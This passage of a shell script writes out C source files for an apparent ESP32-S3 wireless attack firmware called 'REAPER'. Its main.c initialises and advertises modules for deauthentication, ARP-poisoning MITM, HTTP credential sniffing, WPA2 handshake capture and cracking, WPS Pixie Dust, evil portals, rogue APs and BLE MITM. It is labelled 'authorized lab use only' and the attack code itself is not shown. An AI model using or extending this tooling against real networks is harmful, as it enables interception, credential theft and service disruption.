    offset += build_system_methods(table + offset, cap - offset);
    offset += build_wifi_methods(table + offset, cap - offset);
    offset += build_deauth_methods(table + offset, cap - offset);
    offset += build_pcap_methods(table + offset, cap - offset);
    offset += build_ble_methods(table + offset, cap - offset);
    offset += build_80215_methods(table + offset, cap - offset);
    offset += build_storage_methods(table + offset, cap - offset);
    offset += build_ota_methods(table + offset, cap - offset);
    offset += build_platform_methods(table + offset, cap - offset);

    return offset;
}

/*============================================================================*/
esp_err_t jsonrpc_schema_event_post(jsonrpc_event_type_t type, const char *event_json)
{
    if (event_json == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    return jsonrpc_event_post(type, event_json);
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/jsonrpc_schema.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/jsonrpc_schema.h"
#ifndef JSONRPC_SCHEMA_H
#define JSONRPC_SCHEMA_H

#include <stdint.h>
#include <stdbool.h>
#include "esp_err.h"
#include "jsonrpc.h"

#ifdef __cplusplus
extern "C" {
#endif

/* -------------------------------------------------------------------------
 *  JSON-RPC Schema v1 — 7 method groups + async events
 * -------------------------------------------------------------------------
 *
 *  T2T Step 3.2 — Research & Brainstorming
 *
 *  Branch A — Single flat dispatch table in jsonrpc.c
 *    Decision: REJECTED. Unmaintainable as method count grows; violates
 *    single-responsibility; mixes schema docs with transport logic.
 *
 *  Branch B — Grouped schema file + separate method table
 *    Decision: ACCEPTED. Clean separation; each group is documented and
 *    versioned; companion app can query schema for UI generation.
 *
 *  Branch C — Dynamic runtime method registration via linked list
 *    Decision: REJECTED. Overhead and fragmentation; static table is
 *    sufficient and safer for embedded.
 * ------------------------------------------------------------------------- */

/* Maximum length of an async event JSON payload (including NUL). */
#define JSONRPC_EVENT_MAX_LEN 1024

/* Method group identifiers. */
typedef enum {
    JSONRPC_GROUP_SYSTEM = 0,
    JSONRPC_GROUP_WIFI,
    JSONRPC_GROUP_DEAUTH,
    JSONRPC_GROUP_PCAP,
    JSONRPC_GROUP_BLE,
    JSONRPC_GROUP_STORAGE,
    JSONRPC_GROUP_OTA,
    JSONRPC_GROUP_COUNT,
} jsonrpc_group_t;

/* Build the static method table for all v1 groups.
 * Caller passes a pre-allocated array and its capacity; returns count.
 */
uint16_t jsonrpc_schema_v1_build(jsonrpc_method_entry_t *table, uint16_t cap);

/* Post an async event notification to the host. Thread-safe.
 * event_json must not exceed JSONRPC_EVENT_MAX_LEN bytes. */
esp_err_t jsonrpc_schema_event_post(jsonrpc_event_type_t type,
                                    const char *event_json);

/* Return schema version string. */
const char *jsonrpc_schema_version(void);

#ifdef __cplusplus
}
#endif

#endif /* JSONRPC_SCHEMA_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/jsonrpc_schema.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/main.c"
/*
 * ============================================================================
 *  ESP32-S3 · WIRELESS LAB TOOLKIT · main.c
 * ============================================================================
 *  Target   : ESP32-S3-N16R8  (16 MB Flash · 8 MB PSRAM)
 *  Interface: USB-OTG CDC / UART CLI
 *
 *  Notes:
 *    - When USB CDC is detected, the firmware assumes machine/control mode.
 *    - ANSI console output is suppressed in machine mode.
 *    - JSON-RPC initialization wired for phone control over CDC.
 * ============================================================================
 */

#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <stdbool.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_chip_info.h"
#include "esp_flash.h"
#include "esp_heap_caps.h"
#include "esp_idf_version.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "nvs_flash.h"

#include "helper.h"   /* aggregate include — pulls in every module header */

#define TAG "main"

/* ═══════════════════════════════════════════════════════════════════════════
 *  ANSI colour macros
 * ═══════════════════════════════════════════════════════════════════════════ */

#define UI_RESET   "\033[0m"
#define UI_BOLD    "\033[1m"
#define UI_RED     "\033[91m"
#define UI_GREEN   "\033[92m"
#define UI_YELLOW  "\033[93m"
#define UI_BLUE    "\033[94m"
#define UI_MAGENTA "\033[95m"
#define UI_CYAN    "\033[96m"
#define UI_WHITE   "\033[97m"
#define UI_GRAY    "\033[90m"

/* ═══════════════════════════════════════════════════════════════════════════
 *  Build-time constants
 * ═══════════════════════════════════════════════════════════════════════════ */

#define RING_BYTES       (2UL * 1024UL * 1024UL)  /* PCAP ring in PSRAM */
#define BOOT_SCAN_SECS   4                         /* quick startup scan */
#define BOX_W            70                        /* terminal line width */

/* ═══════════════════════════════════════════════════════════════════════════
 *  Boot state
 * ═══════════════════════════════════════════════════════════════════════════ */

static bool s_machine_mode = false;      /* true when phone/CDC control expected */
static bool s_boot_failed = false;       /* critical init failure */
static bool s_boot_degraded = false;     /* optional module failure */
static bool s_led_ready = false;         /* LED module successfully initialized */

static port_detect_result_t s_port = {0};
static jsonrpc_dispatch_t s_rpc_dispatch;
static jsonrpc_method_entry_t s_rpc_methods[128];

/* ═══════════════════════════════════════════════════════════════════════════
 *  Small UI helpers
 * ═══════════════════════════════════════════════════════════════════════════ */

static void ui_hr(const char *ch)
{
    if (s_machine_mode) {
        return;
    }

    printf(UI_GRAY "  ");
    for (int i = 0; i < BOX_W - 2; i++) {
        fputs(ch, stdout);
    }
    printf(UI_RESET "\n");
}

static void ui_section(const char *title)
{
    if (s_machine_mode) {
        return;
    }

    printf(UI_CYAN "\n  ┌─ " UI_BOLD UI_WHITE "%s" UI_RESET "\n", title);
}

static void ui_kv(const char *key, const char *val)
{
    if (s_machine_mode) {
        return;
    }

    printf("  " UI_CYAN "│" UI_RESET "  " UI_GRAY "%-24s" UI_RESET UI_WHITE "%s" UI_RESET "\n",
           key, val);
}

static void ui_cap(const char *icon, const char *label, const char *desc)
{
    if (s_machine_mode) {
        return;
    }

    printf("  " UI_CYAN "│" UI_RESET "  %s  " UI_BOLD UI_WHITE "%-22s" UI_RESET UI_GRAY "%s" UI_RESET "\n",
           icon, label, desc);
}

static void init_report(const char *label, esp_err_t err, bool optional)
{
    if (err == ESP_OK) {
        if (!s_machine_mode) {
            printf("  " UI_CYAN "│" UI_RESET "  " UI_GREEN "✔" UI_RESET
                   "  %-45s " UI_GREEN "OK" UI_RESET "\n",
                   label);
        }
        return;
    }

    if (err == ESP_ERR_INVALID_STATE) {
        if (!s_machine_mode) {
            printf("  " UI_CYAN "│" UI_RESET "  " UI_BLUE "✔" UI_RESET
                   "  %-45s " UI_BLUE "already" UI_RESET "\n",
                   label);
        } else {
            ESP_LOGI(TAG, "%s already initialized", label);
        }
        return;
    }

    if (optional) {
        s_boot_degraded = true;

        if (!s_machine_mode) {
            printf("  " UI_CYAN "│" UI_RESET "  " UI_YELLOW "⚠" UI_RESET
                   "  %-45s " UI_YELLOW "skip" UI_GRAY "  (%s)" UI_RESET "\n",
                   label, esp_err_to_name(err));
        }

        ESP_LOGW(TAG, "Optional init skipped: %s (%s)", label, esp_err_to_name(err));
        return;
    }

    s_boot_failed = true;

    if (!s_machine_mode) {
        printf("  " UI_CYAN "│" UI_RESET "  " UI_RED "✖" UI_RESET
               "  %-45s " UI_RED "FAIL" UI_GRAY "  [%s]" UI_RESET "\n",
               label, esp_err_to_name(err));
    }

    ESP_LOGE(TAG, "Critical init failed: %s (%s)", label, esp_err_to_name(err));
}

#define BOOT_INIT(label, expr, optional)                    \
    do {                                                    \
        esp_err_t boot_init_err = (expr);                   \
        init_report((label), boot_init_err, (optional));    \
    } while (0)

/* ═══════════════════════════════════════════════════════════════════════════
 *  NVS bootstrap
 * ═══════════════════════════════════════════════════════════════════════════ */

static esp_err_t bootstrap_nvs(void)
{
    esp_err_t err = nvs_flash_init();

    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGW(TAG, "NVS partition invalid (%s); erasing and retrying", esp_err_to_name(err));

        esp_err_t erase_err = nvs_flash_erase();
        if (erase_err != ESP_OK) {
            return erase_err;
        }

        err = nvs_flash_init();
    }

    return err;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  Formatting helpers
 * ═══════════════════════════════════════════════════════════════════════════ */

static void format_mac(char *out, size_t out_len, const uint8_t mac[6])
{
    if (out == NULL || out_len < 18) {
        if (out != NULL && out_len > 0) {
            out[0] = '\0';
        }
        return;
    }

    snprintf(out, out_len, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  BANNER
 * ═══════════════════════════════════════════════════════════════════════════ */

static void print_banner(void)
{
    if (s_machine_mode) {
        return;
    }

    /* Clear screen for clean boot look. */
    printf("\033[2J\033[H");

    puts("");

    printf(UI_CYAN
        "  ╔══════════════════════════════════════════════════════════════════╗\n"
        "  ║                                                                  ║\n"
    UI_RESET);

    printf(UI_CYAN "  ║  " UI_RESET UI_YELLOW UI_BOLD
        "   W . L . A . B   ·   W I R E L E S S   L A B   T K   "
    UI_RESET UI_CYAN "  ║\n" UI_RESET);

    printf(UI_CYAN "  ║  " UI_RESET UI_GRAY
        "                  E S P 3 2 - S 3  ·  N 1 6 R 8              "
    UI_RESET UI_CYAN "  ║\n" UI_RESET);

    printf(UI_CYAN
        "  ║                                                                  ║\n"
        "  ╠══════════════════════════════════════════════════════════════════╣\n"
    UI_RESET);

    printf(UI_CYAN "  ║  " UI_RESET UI_GRAY
        "  802.11bgn Sniffer  ·  BLE 5.0  ·  ARP MITM  ·  WPA2 Crack    "
    UI_RESET UI_CYAN "║\n" UI_RESET);

    printf(UI_CYAN "  ║  " UI_RESET UI_GRAY
        "  PCAP Ring  ·  Deauth  ·  Evil Portal  ·  Cred Sniffer         "
    UI_RESET UI_CYAN "║\n" UI_RESET);

    printf(UI_CYAN
        "  ╚══════════════════════════════════════════════════════════════════╝\n"
    UI_RESET);

    puts("");
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  SYSTEM INFORMATION
 * ═══════════════════════════════════════════════════════════════════════════ */

static void print_sysinfo(void)
{
    if (s_machine_mode) {
        return;
    }

    ui_section("Hardware · Firmware");

    esp_chip_info_t ci = {0};
    esp_chip_info(&ci);

    uint32_t flash_size = 0;
    if (esp_flash_get_size(NULL, &flash_size) != ESP_OK) {
        flash_size = 0;
    }

    uint32_t flash_kb = flash_size / 1024;

    size_t int_total = heap_caps_get_total_size(MALLOC_CAP_INTERNAL);
    size_t int_free  = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    size_t ps_total  = heap_caps_get_total_size(MALLOC_CAP_SPIRAM);
    size_t ps_free   = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);

    uint8_t mac_sta[6] = {0};
    uint8_t mac_ap[6]  = {0};
    uint8_t mac_bt[6]  = {0};

    if (esp_read_mac(mac_sta, ESP_MAC_WIFI_STA) != ESP_OK) {
        memset(mac_sta, 0, sizeof(mac_sta));
    }

    if (esp_read_mac(mac_ap, ESP_MAC_WIFI_SOFTAP) != ESP_OK) {
        memset(mac_ap, 0, sizeof(mac_ap));
    }

    if (esp_read_mac(mac_bt, ESP_MAC_BT) != ESP_OK) {
        memset(mac_bt, 0, sizeof(mac_bt));
    }

    char buf[80];
    char mac_str[24];

    snprintf(buf, sizeof(buf), "ESP32-S3 rev %d · %d cores", ci.revision, ci.cores);
    ui_kv("Chip :", buf);

    snprintf(buf, sizeof(buf), "%" PRIu32 " kB", flash_kb);
    ui_kv("Flash :", buf);

    snprintf(buf, sizeof(buf), "%zu kB free / %zu kB total",
             int_free / 1024, int_total / 1024);
    ui_kv("Internal RAM :", buf);

    snprintf(buf, sizeof(buf), "%zu kB free / %zu kB total",
             ps_free / 1024, ps_total / 1024);
    ui_kv("PSRAM :", buf);

    ui_kv("IDF Version :", IDF_VER);

    format_mac(mac_str, sizeof(mac_str), mac_sta);
    ui_kv("MAC · STA :", mac_str);

    format_mac(mac_str, sizeof(mac_str), mac_ap);
    ui_kv("MAC · SoftAP :", mac_str);

    format_mac(mac_str, sizeof(mac_str), mac_bt);
    ui_kv("MAC · BT :", mac_str);

    printf("  " UI_CYAN "│" UI_RESET "\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  MODULE INITIALISATION SEQUENCE
 * ═══════════════════════════════════════════════════════════════════════════ */

static void run_init_sequence(void)
{
    ui_section("Module Initialisation");

    if (!s_machine_mode) {
        port_print_banner(&s_port);
    } else {
        ESP_LOGI(TAG, "Port detection complete; active transport=%d", (int)s_port.active);
    }

    BOOT_INIT("NVS Persistence (settings/targets)", nvs_persist_init(), true);

    if (s_port.active == PORT_TRANSPORT_CDC) {
        ESP_LOGI(TAG, "USB CDC active: companion app/JSON-RPC transport expected");
    }

    /* LED indicator */
    esp_err_t led_err = helper_init();
    init_report("LED Indicator (WS2812, GPIO 48)", led_err, false);

    if (led_err == ESP_OK || led_err == ESP_ERR_INVALID_STATE) {
        s_led_ready = true;
        led_set_rgb(0, 200, 255);
        vTaskDelay(pdMS_TO_TICKS(120));
        led_set_state(LED_STATE_SCANNING);
    }

    /* Core system services */
    BOOT_INIT("Structured Logging (ring + JSON)", structured_log_init(), false);
    BOOT_INIT("Watchdog + Panic Handler", watchdog_init(), false);
    BOOT_INIT("Health Telemetry (heap/PSRAM/temp/uptime)", health_telemetry_init(), false);

    /*
     * USB CDC is critical in machine mode, optional in UART CLI mode.
     */
    BOOT_INIT("USB CDC-ACM Custom VID/PID", usb_cdc_init(), !s_machine_mode);

    /*
     * JSON-RPC server initialization for phone control over CDC.
     */
    uint16_t rpc_count = jsonrpc_schema_v1_build(s_rpc_methods, 128);
    BOOT_INIT("JSON-RPC Schema v1", (rpc_count > 0) ? ESP_OK : ESP_FAIL, !s_machine_mode);
    BOOT_INIT("JSON-RPC Server", jsonrpc_init(&s_rpc_dispatch, s_rpc_methods, rpc_count, NULL), !s_machine_mode);

    /* Storage and update services */
    BOOT_INIT("SD Card Storage (SPI2, /sd)", storage_sd_init(), true);
    BOOT_INIT("SPIFFS Wordlist Store (5 MiB)", storage_spiffs_init(), true);
    BOOT_INIT("OTA Updater (HTTP + RSA-2048)", ota_http_init(), true);

    /* AI / analysis modules */
    BOOT_INIT("AI Model Zoo", ai_model_zoo_init(), false);
    BOOT_INIT("AI Classifier", ai_classifier_init(), false);
    BOOT_INIT("AI Anomaly", ai_anomaly_init(), false);
    BOOT_INIT("AI Fingerprint", ai_fingerprint_init(), false);
    BOOT_INIT("AI Channel Predictor", ai_channel_predictor_init(), false);
    BOOT_INIT("AI Handshake Quality", ai_hs_quality_init(), false);
    BOOT_INIT("AI Rogue Detector", ai_rogue_detector_init(), false);
    BOOT_INIT("AI Deauth Predictor", ai_deauth_predictor_init(), false);
    BOOT_INIT("AI BLE Profiler", ai_ble_profiler_init(), false);
    BOOT_INIT("AI Training", ai_train_init(), false);

    /* Automation / planning / reaction */
    BOOT_INIT("Wardrive", wardrive_init(), false);
    BOOT_INIT("Attack Planner", attack_planner_init(), false);
    BOOT_INIT("Stealth", stealth_init(), false);
    BOOT_INIT("Scheduler", scheduler_init(), false);
    BOOT_INIT("Reaction Rules", reaction_rules_init(), false);

    /* Export / offensive core / CLI bridge */
    BOOT_INIT("Export", export_init(), false);
    BOOT_INIT("Offensive Core", offensive_init(), false);
    BOOT_INIT("CLI Flipper", cli_flipper_init(), false);

    /* Wi-Fi security extensions */
    BOOT_INIT("PMKID Capture", pmkid_init(), false);
    BOOT_INIT("SAE Side-Channel", sae_sidechannel_init(), false);
    BOOT_INIT("Dragonfly Simulator", dragonfly_sim_init(), false);
    BOOT_INIT("FT Roaming", ft_roam_init(), false);
    BOOT_INIT("Neighbor Report", neighbor_report_init(), false);
    BOOT_INIT("BTM", btm_init(), false);
    BOOT_INIT("WPS Pixie Dust", wps_pixiedust_init(), false);
    BOOT_INIT("EAP Capture", eap_capture_init(), false);

    /* Channel hopper (explicit initialization) */
    BOOT_INIT("Channel Hopper", channel_hopper_init(), false);

    /* Wi-Fi core */
    BOOT_INIT("Wi-Fi Coexistence", coex_init(), false);
    BOOT_INIT("Wi-Fi Sniffer", wifi_sniffer_init(), false);

    /* BLE core */
    BOOT_INIT("BLE 5.0 Scanner (NimBLE host)", ble_scanner_init(), false);
    
    /* BLE submodules (explicit initialization) */
    BOOT_INIT("BLE Extended Advertising", ble_ext_adv_init(), true);
    BOOT_INIT("BLE Periodic Advertising", ble_periodic_init(), true);
    BOOT_INIT("BLE PHY Detection", ble_phy_init(), true);
    BOOT_INIT("BLE ISO/BIG", ble_iso_init(), true);
    BOOT_INIT("BLE GATT Client", ble_gatt_client_init(), true);
    BOOT_INIT("BLE GATT Enumerator", ble_gatt_enumerator_init(), true);
    BOOT_INIT("BLE MITM", ble_mitm_init(), true);
    BOOT_INIT("BLE RPA Bypass", ble_rpa_bypass_init(), true);
    BOOT_INIT("BLE FindMy", ble_findmy_init(), true);
    BOOT_INIT("BLE SmartTag", ble_smarttag_init(), true);
    BOOT_INIT("BLE Privacy", ble_privacy_init(), true);
    
    BOOT_INIT("GPS Timestamp Correlator", gps_init(), false);

    /* Network attack/capture engines */
    BOOT_INIT("ARP Poison Engine (MITM + relay)", arp_poison_init(), false);
    BOOT_INIT("HTTP Credential Sniffer (form/cookie/Basic)", creds_init(), false);
    BOOT_INIT("WPA-2 Handshake Capture + Crack (EAPOL)", handshake_init(), false);

    /* Register Wi-Fi packet observers */
    wifi_sniffer_register_observer(ai_anomaly_wifi_observer);
    wifi_sniffer_register_observer(arp_feed_packet);
    wifi_sniffer_register_observer(arp_relay_frame);
    wifi_sniffer_register_observer(handshake_feed_packet);

    /* Packet capture buffer */
    BOOT_INIT("PCAP Ring Buffer (2 MiB PSRAM)", pcap_ring_init(RING_BYTES), false);

    /*
     * In CDC machine mode, JSON-RPC owns the control transport.
     * CLI is kept for compatibility and UART fallback.
     */
    if (s_port.active == PORT_TRANSPORT_CDC) {
        ESP_LOGI(TAG, "CDC active: JSON-RPC owns transport, CLI available as fallback");
    }

    BOOT_INIT("Interactive Serial CLI (auto-selected transport)", cli_start(), false);

    if (!s_machine_mode) {
        printf("  " UI_CYAN "│" UI_RESET "\n");
    }

    if (s_led_ready && !s_boot_failed) {
        led_set_state(LED_STATE_IDLE);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  QUICK BOOT SCAN
 * ═══════════════════════════════════════════════════════════════════════════ */

static void run_boot_scan(void)
{
    if (s_machine_mode || s_boot_failed) {
        return;
    }

    char title[128];
    snprintf(title, sizeof(title),
             "Boot Scan — " UI_YELLOW UI_BOLD "Wi-Fi" UI_RESET
             " (" UI_GRAY "passive, %d s" UI_RESET ")",
             BOOT_SCAN_SECS);

    ui_section(title);

    printf("  " UI_CYAN "│" UI_RESET "\n");
    printf("  " UI_CYAN "│" UI_RESET "  " UI_GRAY
           "Hopping channels 1-13, gathering nearby APs & clients …"
           UI_RESET "\n");
    printf("  " UI_CYAN "│" UI_RESET "\n");

    if (s_led_ready) {
        led_set_state(LED_STATE_SCANNING);
    }

    esp_err_t r = wifi_sniffer_start(BOOT_SCAN_SECS);
    if (r != ESP_OK) {
        printf("  " UI_CYAN "│" UI_RESET "  " UI_RED "scan skipped: %s" UI_RESET "\n",
               esp_err_to_name(r));
    } else {
        /*
         * Poll for scan completion instead of blocking delay.
         * Check every 100ms for up to BOOT_SCAN_SECS + 2 seconds.
         */
        int timeout_ms = (BOOT_SCAN_SECS + 2) * 1000;
        int elapsed_ms = 0;
        
        while (wifi_sniffer_is_active() && elapsed_ms < timeout_ms) {
            vTaskDelay(pdMS_TO_TICKS(100));
            elapsed_ms += 100;
        }

        uint16_t ap_cnt  = wifi_sniffer_get_ap_count();
        uint16_t cli_cnt = wifi_sniffer_get_client_count();

        char buf[80];
        snprintf(buf, sizeof(buf),
                 UI_GREEN "%u" UI_RESET " access points · " UI_GREEN "%u" UI_RESET " clients",
                 ap_cnt, cli_cnt);

        ui_kv("Discovered :", buf);
    }

    if (s_led_ready) {
        led_set_state(LED_STATE_IDLE);
    }

    printf("  " UI_CYAN "│" UI_RESET "\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  CAPABILITY REFERENCE TABLE
 * ═══════════════════════════════════════════════════════════════════════════ */

static void print_capabilities(void)
{
    if (s_machine_mode) {
        return;
    }

    ui_section("Feature Reference — authorized lab use only; type " UI_YELLOW "help" UI_RESET " for syntax");

    printf("  " UI_CYAN "│" UI_RESET "\n");

    ui_cap(UI_CYAN "◈" UI_RESET, "wifi start / pcap", "promiscuous 802.11 sniffer, optional PCAP to SD");
    ui_cap(UI_GREEN "◈" UI_RESET, "ble start / results", "BLE 5.0 scanner with tracker heuristics");
    ui_cap(UI_YELLOW "◈" UI_RESET, "deauth ap / client", "802.11 deauthentication (authorized lab only)");
    ui_cap(UI_MAGENTA "◈" UI_RESET, "arp poison", "ARP MITM with transparent relay to gateway");
    ui_cap(UI_RED "◈" UI_RESET, "creds on / show", "HTTP clear-text credential capture");
    ui_cap(UI_CYAN "◈" UI_RESET, "pcap start / export", "ring-buffer capture; export to SD or serial");
    ui_cap(UI_GREEN "◈" UI_RESET, "beacon spam", "fake-AP beacon generation for lab testing");
    ui_cap(UI_YELLOW "◈" UI_RESET, "portal start", "captive portal testing on owned/open lab AP");
    ui_cap(UI_MAGENTA "◈" UI_RESET, "rogue start", "SSID clone for authorized rogue-AP testing");
    ui_cap(UI_RED "◈" UI_RESET, "probe start", "probe-request generation for lab testing");
    ui_cap(UI_CYAN "◈" UI_RESET, "doj start", "deauth-on-join sentry for controlled lab use");
    ui_cap(UI_GREEN "◈" UI_RESET, "analyzer", "per-channel activity dwell analysis (1-13)");
    ui_cap(UI_YELLOW "◈" UI_RESET, "oui <mac>", "OUI vendor lookup from on-device table");
    ui_cap(UI_MAGENTA "◈" UI_RESET, "save wifi / ble", "write discovered device report to SD card");

    printf("  " UI_CYAN "│" UI_RESET "\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  READY FOOTER
 * ═══════════════════════════════════════════════════════════════════════════ */

static void print_ready_footer(void)
{
    if (s_machine_mode) {
        return;
    }

    ui_hr("─");

    printf("\n");
    printf(UI_GRAY "  Uptime      : " UI_RESET UI_WHITE "%" PRId64 " ms" UI_RESET "\n",
           (int64_t)(esp_timer_get_time() / 1000));

    printf(UI_GRAY "  PCAP ring   : " UI_RESET UI_WHITE "2 MiB ready  "
           UI_GRAY "(pcap start → pcap export)" UI_RESET "\n");

    if (storage_sd_is_ready()) {
        printf(UI_GRAY "  SD card     : " UI_RESET UI_GREEN "mounted at /sd" UI_RESET "\n");
    } else {
        printf(UI_GRAY "  SD card     : " UI_RESET UI_YELLOW "not present  "
               UI_GRAY "(insert for file export)" UI_RESET "\n");
    }

    if (s_boot_degraded) {
        printf(UI_YELLOW "  Boot state  : degraded — one or more optional modules failed" UI_RESET "\n");
    } else {
        printf(UI_GREEN "  Boot state  : healthy" UI_RESET "\n");
    }

    printf("\n");
    printf("  " UI_BOLD UI_CYAN
           "──────────────────────────────────────────────────────────────"
           UI_RESET "\n");
    printf("  " UI_BOLD UI_WHITE "  Console ready.  Type " UI_RESET
           UI_YELLOW UI_BOLD "help" UI_RESET UI_BOLD UI_WHITE
           " for the full command reference." UI_RESET "\n");
    printf("  " UI_BOLD UI_CYAN
           "──────────────────────────────────────────────────────────────"
           UI_RESET "\n");
    printf("\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

void app_main(void)
{
    /*
     * Boot order:
     *   1. NVS bootstrap
     *   2. transport detection
     *   3. banner/sysinfo if human console mode
     *   4. module init
     *   5. optional quick scan
     *   6. capability/help footer
     */

    esp_err_t nvs_err = bootstrap_nvs();
    if (nvs_err != ESP_OK) {
        ESP_LOGE(TAG, "NVS bootstrap failed: %s", esp_err_to_name(nvs_err));
        s_boot_failed = true;
    }

    boot_port_detect(&s_port);
    s_machine_mode = (s_port.active == PORT_TRANSPORT_CDC);

    if (s_machine_mode) {
        ESP_LOGI(TAG, "Machine mode: USB CDC detected; suppressing ANSI console");
    }

    print_banner();
    print_sysinfo();
    run_init_sequence();

    if (!s_boot_failed) {
        run_boot_scan();
        print_capabilities();
        print_ready_footer();
    } else {
        ESP_LOGE(TAG, "Critical initialization failure detected");

        if (!s_machine_mode) {
            printf("\n  " UI_RED UI_BOLD "Critical initialization failure." UI_RESET "\n");
            printf("  Check ESP_LOG output and fix failing modules before continuing.\n\n");
        }
    }

    if (s_led_ready) {
        if (s_boot_failed) {
            led_set_rgb(255, 0, 0);
        } else if (s_boot_degraded) {
            led_set_rgb(255, 160, 0);
        } else {
            led_set_state(LED_STATE_IDLE);
        }
    }

    if (s_boot_failed) {
        ESP_LOGE(TAG, "Boot finished with critical errors");
    } else if (s_boot_degraded) {
        ESP_LOGW(TAG, "Boot finished in degraded state");
    } else {
        ESP_LOGI(TAG, "Boot complete");
    }

    /*
     * app_main returns here.
     *
     * Expected long-running tasks:
     *   - CLI task
     *   - USB CDC / JSON-RPC task(s)
     *   - Wi-Fi sniffer/worker task(s)
     *   - BLE host stack task(s)
     *   - LED task
     *   - watchdog/health task(s)
     */
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/main.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/nvs_persist.c"
/*
 * ============================================================================
 *  nvs_persist.c  —  NVS persistence for REAPER settings/targets/wordlists
 * ============================================================================
 */

#include "nvs_persist.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "deauth_engine.h"

#include <string.h>
#include <stdio.h>
#include <inttypes.h>

#include "esp_err.h"
#include "esp_log.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *NS = "reaper";

static SemaphoreHandle_t g_nvs_lock = NULL;

#define MAX_SAVED_TARGETS 100
#define MAX_SAVED_WORDLISTS 16

typedef struct {
    char name[64];
    size_t count;
    uint32_t duration_ms;
} wordlist_meta_t;

esp_err_t persist_init(void)
{
    if (g_nvs_lock == NULL) {
        g_nvs_lock = xSemaphoreCreateMutex();
        if (g_nvs_lock == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    return ret;
}

static nvs_handle_t open_handle(bool write)
{
    nvs_handle_t h;
    esp_err_t ret = nvs_open(NS, write ? NVS_READWRITE : NVS_READONLY, &h);
    return (ret == ESP_OK) ? h : 0;
}

/* ── Simple scalar helpers ─────────────────────────────────────────────── */

esp_err_t persist_set_u32(const char *key, uint32_t value)
{
    if (!key || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    
    nvs_handle_t h = open_handle(true);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_FAIL; }
    
    esp_err_t ret = nvs_set_u32(h, key, value);
    if (ret == ESP_OK) ret = nvs_commit(h);
    nvs_close(h);
    
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

esp_err_t persist_get_u32(const char *key, uint32_t *out, uint32_t def)
{
    if (!out || !key || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    *out = def;
    
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(false);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_ERR_NOT_FOUND; }
    
    esp_err_t ret = nvs_get_u32(h, key, out);
    nvs_close(h);
    
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

esp_err_t persist_set_u8(const char *key, uint8_t value)
{
    if (!key || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    
    nvs_handle_t h = open_handle(true);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_FAIL; }
    
    esp_err_t ret = nvs_set_u8(h, key, value);
    if (ret == ESP_OK) ret = nvs_commit(h);
    nvs_close(h);
    
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

esp_err_t persist_get_u8(const char *key, uint8_t *out, uint8_t def)
{
    if (!out || !key || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    *out = def;
    
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(false);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_ERR_NOT_FOUND; }
    
    esp_err_t ret = nvs_get_u8(h, key, out);
    nvs_close(h);
    
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

esp_err_t persist_set_bool(const char *key, bool value)
{
    return persist_set_u8(key, value ? 1 : 0);
}

esp_err_t persist_get_bool(const char *key, bool *out, bool def)
{
    if (!out) return ESP_ERR_INVALID_ARG;
    uint8_t v = def ? 1 : 0;
    esp_err_t ret = persist_get_u8(key, &v, v);
    if (ret == ESP_OK) *out = (v != 0);
    return ret;
}

esp_err_t persist_set_str(const char *key, const char *value)
{
    if (!key || !value || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    
    nvs_handle_t h = open_handle(true);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_FAIL; }
    
    esp_err_t ret = nvs_set_str(h, key, value);
    if (ret == ESP_OK) ret = nvs_commit(h);
    nvs_close(h);
    
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

esp_err_t persist_get_str(const char *key, char *out, size_t out_len, const char *def)
{
    if (!out || !out_len || !key || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    out[0] = '\0';
    
